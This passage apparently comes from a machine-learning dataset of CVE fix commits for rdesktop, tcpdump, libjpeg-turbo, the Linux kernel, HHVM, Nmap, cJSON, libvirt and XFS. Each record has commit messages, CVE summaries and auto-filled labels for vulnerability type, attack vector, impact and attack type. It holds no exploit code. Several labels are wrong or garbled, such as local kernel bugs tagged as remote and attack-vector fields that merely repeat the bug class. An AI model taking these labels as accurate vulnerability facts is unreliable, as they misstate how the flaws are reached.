ui_clip_handle_data - CVE-2018-20174\n * Fix memory corruption in rdp_in_unistr - CVE-2018-20177\n * Fix Denial of Service in process_demand_active - CVE-2018-20178\n * Fix remote code execution in lspci_process - CVE-2018-20179\n * Fix remote code execution in rdpsnddbg_process - CVE-2018-20180\n * Fix remote code execution in seamless_process - CVE-2018-20181\n * Fix remote code execution in seamless_process_line - CVE-2018-20182","summary":"rdesktop versions up to and including v1.8.3 contain a Buffer Overflow over the global variables in the function seamless_process_line() that results in memory corruption and probably even a remote code execution.","commit_message_1":"malicious rdp server security fix this commit includes fix for a set of <number> vulnerability in rdesktop when a malicious rdp server is used","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to connect to a malicious RDP server","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the seamless_process_line() function","Attack Type":"remote attacker"},{"commit_id":"24182d959f661327525a20d9a94c98a8ec016778","cve_id":"CVE-2018-16452","cwe_id":"CWE-674","commit_message":"(for 4.9.3) CVE-2018-16452\/SMB: prevent stack exhaustion\n\nEnforce a limit on how many times smb_fdata() can recurse.\n\nThis fixes a stack exhaustion discovered by Include Security working\nunder the Mozilla SOS program in 2018 by means of code audit.","summary":"The SMB parser in tcpdump before 4.9.3 has stack exhaustion in smbutil.c:smb_fdata() via recursion.","commit_message_1":"prevent stack exhaustion enforce a limit on how many time smb_fdata ( ) can recurse","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has stack exhaustion","Attack Type":"remote attacker"},{"commit_id":"96480ab95308cd9234b4f09b175ebf60e17792c6","cve_id":"CVE-2018-16451","cwe_id":"CWE-125","commit_message":"(for 4.9.3) SMB: Add two missing bounds checks","summary":"The SMB parser in tcpdump before 4.9.3 has buffer over-reads in print-smb.c:print_trans() for MAILSLOTBROWSE and PIPELANMAN.","commit_message_1":"smb : add two missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has buffer over - reads","Attack Type":"remote attacker"},{"commit_id":"af2cf04a9394c1a56227c2289ae8da262828294a","cve_id":"CVE-2018-16300","cwe_id":"CWE-674","commit_message":"(for 4.9.3) CVE-2018-16300\/BGP: prevent stack exhaustion\n\nEnforce a limit on how many times bgp_attr_print() can recurse.\n\nThis fixes a stack exhaustion discovered by Include Security working\nunder the Mozilla SOS program in 2018 by means of code audit.","summary":"The BGP parser in tcpdump before 4.9.3 allows stack consumption in print-bgp.c:bgp_attr_print() because of unlimited recursion.","commit_message_1":"prevent stack exhaustion enforce a limit on how many time bgp_attr_print ( ) can recurse","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"caused by stack exhaustion","Attack Type":"remote attacker"},{"commit_id":"13d52e9c0e7caf7e6325b0051bc90a49968be67f","cve_id":"CVE-2018-16230","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-16230\/BGP: fix decoding of MP_REACH_NLRI\n\nWhen bgp_attr_print() tried to decode the variable-length nexthop value\nfor the NSAP VPN case, it did not check that the declared length is good\nto interpret the value as a mapped IPv4 or IPv6 address. Add missing\nchecks to make this safe.\n\nThis fixes a buffer over-read discovered by Include Security working\nunder the Mozilla SOS program in 2018 by means of code audit.\n\nBhargava Shastry, SecT\/TU Berlin, had independently identified this\nvulnerability by means of fuzzing and provided the packet capture file\nfor the test.","summary":"The BGP parser in tcpdump before 4.9.3 has a buffer over-read in print-bgp.c:bgp_attr_print() (MP_REACH_NLRI).","commit_message_1":"fix decoding of mp_reach_nlri when bgp_attr_print ( ) tried to decode the variable-length nexthop value for the nsap vpn case , it did not check that the declared length is good to interpret the value a a mapped ipv4 or ipv6 address","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"211124b972e74f0da66bc8b16f181f78793e2f66","cve_id":"CVE-2018-16229","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-16229\/DCCP: Fix printing \"Timestamp\" and \"Timestamp Echo\" options\n\nAdd some comments.\n\nMoreover:\nPut a function definition name at the beginning of the line.\n\n(This change was ported from commit 6df4852 in the master branch.)\n\nRyan Ackroyd had independently identified this buffer over-read later by\nmeans of fuzzing and provided the packet capture file for the test.","summary":"The DCCP parser in tcpdump before 4.9.3 has a buffer over-read in print-dccp.c:dccp_print_option().","commit_message_1":"fix printing `` timestamp '' and `` timestamp echo '' option add some comment","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"83a412a5275cac973c5841eca3511c766bed778d","cve_id":"CVE-2018-16228","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-16228\/HNCP: make buffer access safer\n\nprint_prefix() has a buffer and does not initialize it. It may call\ndecode_prefix6(), which also does not initialize the buffer on invalid\ninput. When that happens, make sure to return from print_prefix() before\ntrying to print the [still uninitialized] buffer.\n\nThis fixes a buffer over-read discovered by Wang Junjie of 360 ESG\nCodesafe Team.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The HNCP parser in tcpdump before 4.9.3 has a buffer over-read in print-hncp.c:print_prefix().","commit_message_1":"make buffer access safer print_prefix ( ) ha a buffer and doe not initialize it","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"4846b3c5d0a850e860baf4f07340495d29837d09","cve_id":"CVE-2018-16227","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-16227\/IEEE 802.11: add a missing bounds check\n\nieee802_11_print() tried to access the Mesh Flags subfield of the Mesh\nControl field to find the size of the latter and increment the expected\n802.11 header length before checking it is fully present in the input\nbuffer. Add an intermediate bounds check to make it safe.\n\nThis fixes a buffer over-read discovered by Ryan Ackroyd.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The IEEE 802.11 parser in tcpdump before 4.9.3 has a buffer over-read in print-802_11.c for the Mesh Flags subfield.","commit_message_1":"add a missing bound check ieee802_11_print ( ) tried to access the mesh flag subfield of the mesh control field to find the size of the latter and increment the expected <file> header length before checking it is fully present in the input buffer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"d7505276842e85bfd067fa21cdb32b8a2dc3c5e4","cve_id":"CVE-2018-14882","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14882\/ICMP6 RPL: Add a missing bounds check\n\nMoreover:\nAdd and use *_tstr[] strings.\nUpdate four tests outputs accordingly.\nFix a space.\n\nWang Junjie of 360 ESG Codesafe Team had independently identified this\nvulnerability in 2018 by means of fuzzing and provided the packet capture\nfile for the test.","summary":"The ICMPv6 parser in tcpdump before 4.9.3 has a buffer over-read in print-icmp6.c.","commit_message_1":"add a missing bound check moreover : add and use * _tstr [ ] string","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"86326e880d31b328a151d45348c35220baa9a1ff","cve_id":"CVE-2018-14881","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14881\/BGP: Fix BGP_CAPCODE_RESTART.\n\nAdd a bounds check and a comment to bgp_capabilities_print().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.3 has a buffer over-read in print-bgp.c:bgp_capabilities_print() (BGP_CAPCODE_RESTART).","commit_message_1":"fix bgp_capcode_restart","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"e01c9bf76740802025c9328901b55ee4a0c49ed6","cve_id":"CVE-2018-14880","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14880\/OSPFv3: Fix a bounds check\n\nNeed to test bounds check for the last field of the structure lsa6_hdr.\nNo need to test other fields.\n\nInclude Security working under the Mozilla SOS program had independently\nidentified this vulnerability in 2018 by means of code audit.\n\nWang Junjie of 360 ESG Codesafe Team had independently identified this\nvulnerability in 2018 by means of fuzzing and provided the packet capture\nfile for the test.","summary":"The OSPFv3 parser in tcpdump before 4.9.3 has a buffer over-read in print-ospf6.c:ospf6_print_lshdr().","commit_message_1":"fix a bound check need to test bound check for the last field of the structure lsa6_hdr","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"9ba91381954ad325ea4fd26b9c65a8bd9a2a85b6","cve_id":"CVE-2018-14879","cwe_id":"CWE-120","commit_message":"(for 4.9.3) CVE-2018-14879\/fix -V to fail invalid input safely\n\nget_next_file() did not check the return value of strlen() and\nunderflowed an array index if the line read by fgets() from the file\nstarted with \\0. This caused an out-of-bounds read and could cause a\nwrite. Add the missing check.\n\nThis vulnerability was discovered by Brian Carpenter & Geeknik Labs.","summary":"The command-line argument parser in tcpdump before 4.9.3 has a buffer overflow in tcpdump.c:get_next_file().","commit_message_1":"<cve_id>\/fix -v to fail invalid input safely get_next_file ( ) did not check the return value of strlen ( ) and underflowed an array index if the line read by fgets ( ) from the file started with \\<number>","Vulnerability Type":"Classic Buffer Overflow","Attack Vector":"caused by improper bounds checking by get_next_file function","Impact":"overflow a buffer","Root Cause":"has a buffer overflow","Attack Type":"local attacker"},{"commit_id":"9c78a04df4e44ef6487eee99c4258397f4fdca55","cve_id":"CVE-2018-14498","cwe_id":"CWE-125","commit_message":"cjpeg: Fix OOB read caused by malformed 8-bit BMP\n\n... in which one or more of the color indices is out of range for the\nnumber of palette entries.\n\nFix partly borrowed from jpeg-9c.  This commit also adopts Guido's\nJERR_PPM_OUTOFRANGE enum value in lieu of our project-specific\nJERR_PPM_TOOLARGE enum value.\n\nFixes #258","summary":"get_8bit_row in rdbmp.c in libjpeg-turbo through 1.5.90 and MozJPEG through 3.3.1 allows attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted 8-bit BMP in which one or more of the color indices is out of range for the number of palette entries.","commit_message_1":"fix oob read caused by malformed <number>-bit bmp","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted 8 - bit bmp in which one or more of the color indices is out of range for the number of palette entries","Impact":"cause a denial of service ( heap - based buffer over - read and application crash )","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"12f66f69f7bf1ec1266ddbee90a7616cbf33696b","cve_id":"CVE-2018-14470","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14470\/Babel: fix an existing length check\n\nIn babel_print_v2() the non-verbose branch for an Update TLV compared\nthe TLV Length against 1 instead of 10 (probably a typo), put it right.\n\nThis fixes a buffer over-read discovered by Henri Salo from Nixu\nCorporation.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The Babel parser in tcpdump before 4.9.3 has a buffer over-read in print-babel.c:babel_print_v2().","commit_message_1":"fix an existing length check in babel_print_v2 ( ) the non-verbose branch for an update tlv compared the tlv length against <number> instead of <number> ( probably a typo ) , put it right","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"396e94ff55a80d554b1fe46bf107db1e91008d6c","cve_id":"CVE-2018-14469","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14469\/ISAKMP: Add a missing bounds check\n\nIn ikev1_n_print() check bounds before trying to fetch the replay detection\nstatus.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The IKEv1 parser in tcpdump before 4.9.3 has a buffer over-read in print-isakmp.c:ikev1_n_print().","commit_message_1":"add a missing bound check in ikev1_n_print ( ) check bound before trying to fetch the replay detection status","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"aa3e54f594385ce7e1e319b0c84999e51192578b","cve_id":"CVE-2018-14468","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14468\/FRF.16: Add a missing length check.\n\nThe specification says in a well-formed Magic Number information element\nthe data is exactly 4 bytes long. In mfr_print() check this before trying\nto read those 4 bytes.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The FRF.16 parser in tcpdump before 4.9.3 has a buffer over-read in print-fr.c:mfr_print().","commit_message_1":"add a missing length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"e3f3b445e2d20ac5d5b7fcb7559ce6beb55da0c9","cve_id":"CVE-2018-14467","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14467\/BGP: Fix BGP_CAPCODE_MP.\n\nAdd a bounds check and a comment to bgp_capabilities_print().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.3 has a buffer over-read in print-bgp.c:bgp_capabilities_print() (BGP_CAPCODE_MP).","commit_message_1":"fix bgp_capcode_mp","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"c24922e692a52121e853a84ead6b9337f4c08a94","cve_id":"CVE-2018-14466","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14466\/Rx: fix an over-read bug\n\nIn rx_cache_insert() and rx_cache_find() properly read the serviceId\nfield of the rx_header structure as a 16-bit integer. When those\nfunctions tried to read 32 bits the extra 16 bits could be outside of\nthe bounds checked in rx_print() for the rx_header structure, as\nserviceId is the last field in that structure.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The Rx parser in tcpdump before 4.9.3 has a buffer over-read in print-rx.c:rx_cache_find() and rx_cache_insert().","commit_message_1":"fix an over-read bug in rx_cache_insert ( ) and rx_cache_find ( ) properly read the serviceid field of the rx_header structure a a <number>-bit integer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"bea2686c296b79609060a104cc139810785b0739","cve_id":"CVE-2018-14465","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14465\/RSVP: Add a missing bounds check\n\nIn rsvp_obj_print().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The RSVP parser in tcpdump before 4.9.3 has a buffer over-read in print-rsvp.c:rsvp_obj_print().","commit_message_1":"add a missing bound check in rsvp_obj_print ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"d97e94223720684c6aa740ff219e0d19426c2220","cve_id":"CVE-2018-14464","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14464\/LMP: Add a missing bounds check\n\nIn lmp_print_data_link_subobjs().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The LMP parser in tcpdump before 4.9.3 has a buffer over-read in print-lmp.c:lmp_print_data_link_subobjs().","commit_message_1":"add a missing bound check in lmp_print_data_link_subobjs ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"3de07c772166b7e8e8bb4b9d1d078f1d901b570b","cve_id":"CVE-2018-14463","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14463\/VRRP: Add a missing bounds check\n\nIn vrrp_print().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The VRRP parser in tcpdump before 4.9.3 has a buffer over-read in print-vrrp.c:vrrp_print().","commit_message_1":"add a missing bound check in vrrp_print ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"1a1bce0526a77b62e41531b00f8bb5e21fd4f3a3","cve_id":"CVE-2018-14462","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14462\/ICMP: Add a missing bounds check\n\nIn icmp_print().\n\nThis fixes a buffer over-read discovered by Bhargava Shastry.\n\nAdd two tests using the capture files supplied by the reporter(s).","summary":"The ICMP parser in tcpdump before 4.9.3 has a buffer over-read in print-icmp.c:icmp_print().","commit_message_1":"add a missing bound check in icmp_print ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"aa5c6b710dfd8020d2c908d6b3bd41f1da719b3b","cve_id":"CVE-2018-14461","cwe_id":"CWE-125","commit_message":"(for 4.9.3) CVE-2018-14461\/LDP: Fix a bounds check\n\nIn ldp_tlv_print(), the FT Session TLV length must be 12, not 8 (RFC3479)\n\nThis fixes a buffer over-read discovered by Konrad Rieck and\nBhargava Shastry.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nMoreover:\nAdd and use tstr[].\nAdd a comment.","summary":"The LDP parser in tcpdump before 4.9.3 has a buffer over-read in print-ldp.c:ldp_tlv_print().","commit_message_1":"fix a bound check in ldp_tlv_print ( ) , the ft session tlv length must be <number> , not <number> ( rfc3479 ) this fix a buffer over-read discovered by konrad rieck and bhargava shastry","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"0ad646c81b2182f7fa67ec0c8c825e0ee165696d","cve_id":"CVE-2018-7191","cwe_id":"CWE-476","commit_message":"tun: call dev_get_valid_name() before register_netdevice()\n\nregister_netdevice() could fail early when we have an invalid\ndev name, in which case ->ndo_uninit() is not called. For tun\ndevice, this is a problem because a timer etc. are already\ninitialized and it expects ->ndo_uninit() to clean them up.\n\nWe could move these initializations into a ->ndo_init() so\nthat register_netdevice() knows better, however this is still\ncomplicated due to the logic in tun_detach().\n\nTherefore, I choose to just call dev_get_valid_name() before\nregister_netdevice(), which is quicker and much easier to audit.\nAnd for this specific case, it is already enough.\n\nFixes: 96442e42429e (\"tuntap: choose the txq based on rxq\")\nReported-by: Dmitry Alexeev <avekceeb@gmail.com>\nCc: Jason Wang <jasowang@redhat.com>\nCc: \"Michael S. Tsirkin\" <mst@redhat.com>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the tun subsystem in the Linux kernel before 4.13.14, dev_get_valid_name is not called before register_netdevice. This allows local users to cause a denial of service (NULL pointer dereference and panic) via an ioctl(TUNSETIFF) call with a dev name containing a \/ character. This is similar to CVE-2013-4343.","commit_message_1":"call dev_get_valid_name ( ) before register_netdevice ( ) register_netdevice ( ) could fail early when we have an invalid dev name , in which case - > ndo_uninit ( ) is not called","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an ioctl ( tunsetiff ) call with a dev name containing a \/ character .","Impact":"cause a denial of service ( pointer dereference and panic","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"190ffdf6c8b1ec443be202c7d69e63a7e3da25e3","cve_id":"CVE-2018-6345","cwe_id":"CWE-119","commit_message":"Fix a bug in number_format()\n\nSummary: In case of error while calling snprintf, return empty string instead of malformed string.\n\nReviewed By: binliu19\n\nDifferential Revision: D13379372\n\nfbshipit-source-id: 1e5611598464daccc674d5a96558c9f2aee08fc8","summary":"The function number_format is vulnerable to a heap overflow issue when its second argument ($dec_points) is excessively large. The internal implementation of the function will cause a string to be created with an invalid length, which can then interact poorly with other functions. This affects all supported versions of HHVM (3.30.1 and 3.27.5 and below).","commit_message_1":"fix a bug in number_format ( ) summary : in case of error while calling snprintf , return empty string instead of malformed string","Vulnerability Type":"buffer overflow","Attack Vector":"which can then interact poorly with other functions","Impact":"cause a denial of service","Root Cause":"caused by a data corruption","Attack Type":"remote attacker"},{"commit_id":"350bbe0597d37ad67abe5fef8fba984707b4e9ad","cve_id":"CVE-2017-18594","cwe_id":"CWE-415","commit_message":"Avoid a crash (double-free) when SSH connection fails","summary":"nse_libssh2.cc in Nmap 7.70 is subject to a denial of service condition due to a double free when an SSH connection fails, as demonstrated by a leading n character to ssh-brute.nse or ssh-auth-methods.nse.","commit_message_1":"avoid a crash ( double-free ) when ssh connection fails","Vulnerability Type":"double free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"remote attacker"},{"commit_id":"99253eb750fda6a644d5188fb26c43bad8d5a745","cve_id":"CVE-2017-18509","cwe_id":"CWE-20","commit_message":"ipv6: check sk sk_type and protocol early in ip_mroute_set\/getsockopt\n\nCommit 5e1859fbcc3c (\"ipv4: ipmr: various fixes and cleanups\") fixed\nthe issue for ipv4 ipmr:\n\n  ip_mroute_setsockopt() & ip_mroute_getsockopt() should not\n  access\/set raw_sk(sk)->ipmr_table before making sure the socket\n  is a raw socket, and protocol is IGMP\n\nThe same fix should be done for ipv6 ipmr as well.\n\nThis patch can fix the panic caused by overwriting the same offset\nas ipmr_table as in raw_sk(sk) when accessing other type's socket\nby ip_mroute_setsockopt().\n\nSigned-off-by: Xin Long <lucien.xin@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"An issue was discovered in net\/ipv6\/ip6mr.c in the Linux kernel before 4.11. By setting a specific socket option, an attacker can control a pointer in kernel land and cause an inet_csk_listen_stop general protection fault, or potentially execute arbitrary code under certain circumstances. The issue can be triggered as root (e.g., inside a default LXC container or with the CAP_NET_ADMIN capability) or after namespace unsharing. This occurs because sk_type and protocol are not checked in the appropriate part of the ip6_mroute_* functions. NOTE: this affects Linux distributions that use 4.9.x longterm kernels before 4.9.187.","commit_message_1":"check sk sk_type and protocol early in ip_mroute_set\/getsockopt commit 5e1859fbcc3c ( `` ipv4 : ipmr : various fix and cleanup '' ) fixed the issue for ipv4 ipmr : ip_mroute_setsockopt ( ) & ip_mroute_getsockopt ( ) should not access\/set raw_sk ( sk ) - > ipmr_table before making sure the socket is a raw socket , and protocol is igmp the same fix should be done for ipv6 ipmr a well","Vulnerability Type":"Improper Input Validation","Attack Vector":"By setting a specific socket option","Impact":"cause a denial of service","Root Cause":"caused by a failure to validate appropriate socket type before access","Attack Type":"remote attacker"},{"commit_id":"0c319d3a144d4b8f1ea2047fd614d2149b68f889","cve_id":"CVE-2017-18379","cwe_id":"CWE-119","commit_message":"nvmet-fc: ensure target queue id within range.\n\nWhen searching for queue id's ensure they are within the expected range.\n\nSigned-off-by: James Smart <james.smart@broadcom.com>\nSigned-off-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"In the Linux kernel before 4.14, an out of boundary access happened in drivers\/nvme\/target\/fc.c.","commit_message_1":"ensure target queue id within range","Vulnerability Type":"buffer overflow","Attack Vector":"an out of boundary access","Impact":"perform unspecified actions","Root Cause":"caused by out-of-bounds access","Attack Type":"remote attacker"},{"commit_id":"6aeb75e6adfaed16e58780309613a578fe1ee90b","cve_id":"CVE-2017-18360","cwe_id":"CWE-369","commit_message":"USB: serial: io_ti: fix div-by-zero in set_termios\n\nFix a division-by-zero in set_termios when debugging is enabled and a\nhigh-enough speed has been requested so that the divisor value becomes\nzero.\n\nInstead of just fixing the offending debug statement, cap the baud rate\nat the base as a zero divisor value also appears to crash the firmware.\n\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nCc: stable <stable@vger.kernel.org>     # 2.6.12\nReviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"In change_port_settings in drivers\/usb\/serial\/io_ti.c in the Linux kernel before 4.11.3, local users could cause a denial of service by division-by-zero in the serial device layer by trying to set very high baud rates.","commit_message_1":"serial : io_ti : fix div-by-zero in set_termios fix a division-by-zero in set_termios when debugging is enabled and a high-enough speed ha been requested so that the divisor value becomes zero","Vulnerability Type":"Divide By Zero","Attack Vector":"by trying to set very high baud rates .","Impact":"cause a denial of service","Root Cause":"caused by a divide-by-zero","Attack Type":"local attacker"},{"commit_id":"193e87143c290ec16838f5368adc0e0bc94eb931","cve_id":"CVE-2016-10764","cwe_id":"CWE-119","commit_message":"mtd: spi-nor: Off by one in cqspi_setup_flash()\n\nThere are CQSPI_MAX_CHIPSELECT elements in the ->f_pdata array so the >\nshould be >=.\n\nFixes: 140623410536 ('mtd: spi-nor: Add driver for Cadence Quad SPI Flash Controller')\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: Marek Vasut <marex@denx.de>\nSigned-off-by: Cyrille Pitchen <cyrille.pitchen@atmel.com>","summary":"In the Linux kernel before 4.9.6, there is an off by one in the drivers\/mtd\/spi-nor\/cadence-quadspi.c cqspi_setup_flash() function. There are CQSPI_MAX_CHIPSELECT elements in the ->f_pdata array so the *>* should be *>=* instead.","commit_message_1":"spi-nor : off by one in cqspi_setup_flash ( ) there are cqspi_max_chipselect element in the - > f_pdata array so the > should be > =","Vulnerability Type":"buffer overflow","Attack Vector":"buffer overflow","Impact":"overflow the ->f_pdata array and perform unspecified actions","Root Cause":"caused by an off-by-on issue","Attack Type":"remote attacker"},{"commit_id":"94df772485c92866ca417d92137747b2e3b0a917","cve_id":"CVE-2016-10749","cwe_id":"CWE-125","commit_message":"fix buffer overflow (#30)","summary":"parse_string in cJSON.c in cJSON before 2016-10-02 has a buffer over-read, as demonstrated by a string that begins with a * character and ends with a  character.","commit_message_1":"fix buffer overflow ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending specially-crafted data","Impact":"cause a denial of service","Root Cause":"has a buffer over - read , as demonstrated by a string that begins with a * character and ends with a character","Attack Type":"remote attacker"},{"commit_id":"506e9d6c2d4baaf580d489fff0690c0ff2ff588f","cve_id":"CVE-2016-10746","cwe_id":"CWE-254","commit_message":"virDomainGetTime: Deny on RO connections\n\nWe have a policy that if API may end up talking to a guest agent\nit should require RW connection. We don't obey the rule in\nvirDomainGetTime().\n\nSigned-off-by: Michal Privoznik <mprivozn@redhat.com>","summary":"libvirt-domain.c in libvirt before 1.3.1 supports virDomainGetTime API calls by guest agents with an RO connection, even though an RW connection was supposed to be required, a different vulnerability than CVE-2019-3886.","commit_message_1":"deny on ro connection we have a policy that if api may end up talking to a guest agent it should require rw connection","Vulnerability Type":"Security Features","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by improper permission validation","Attack Type":"remote attacker"},{"commit_id":"04197b341f23b908193308b8d63d17ff23232598","cve_id":"CVE-2016-10741","cwe_id":"CWE-362","commit_message":"xfs: don't BUG() on mixed direct and mapped I\/O\n\nWe've had reports of generic\/095 causing XFS to BUG() in\n__xfs_get_blocks() due to the existence of delalloc blocks on a\ndirect I\/O read. generic\/095 issues a mix of various types of I\/O,\nincluding direct and memory mapped I\/O to a single file. This is\nclearly not supported behavior and is known to lead to such\nproblems. E.g., the lack of exclusion between the direct I\/O and\nwrite fault paths means that a write fault can allocate delalloc\nblocks in a region of a file that was previously a hole after the\ndirect read has attempted to flush\/inval the file range, but before\nit actually reads the block mapping. In turn, the direct read\ndiscovers a delalloc extent and cannot proceed.\n\nWhile the appropriate solution here is to not mix direct and memory\nmapped I\/O to the same regions of the same file, the current\nBUG_ON() behavior is probably overkill as it can crash the entire\nsystem.  Instead, localize the failure to the I\/O in question by\nreturning an error for a direct I\/O that cannot be handled safely\ndue to delalloc blocks. Be careful to allow the case of a direct\nwrite to post-eof delalloc blocks. This can occur due to speculative\npreallocation and is safe as post-eof blocks are not accompanied by\ndirty pages in pagecache (conversely, preallocation within eof must\nhave been zeroed, and thus dirtied, before the inode size could have\nbeen increased beyond said blocks).\n\nFinally, provide an additional warning if a direct I\/O write occurs\nwhile the file is memory mapped. This may not catch all problematic\nscenarios, but provides a hint that some known-to-be-problematic I\/O\nmethods are in use.\n\nSigned-off-by: Brian Foster <bfoster@redhat.com>\nReviewed-by: Dave Chinner <dchinner@redhat.com>\nSigned-off-by: Dave Chinner <david@fromorbit.com>","summary":"In the Linux kernel before 4.9.3, fs\/xfs\/xfs_aops.c allows local users to cause a denial of service (system crash) because there is a race condition between direct and memory-mapped I\/O (associated with a hole) that is handled with BUG_ON instead of an I\/O failure.","commit_message_1":"do n't bug ( ) on mixed direct and mapped i\/o we 've had report of generic\/<number> causing xfs to bug ( ) in __xfs_get_blocks ( ) due to the existence of delalloc block on a direct i\/o read","Vulnerability Type":"Race 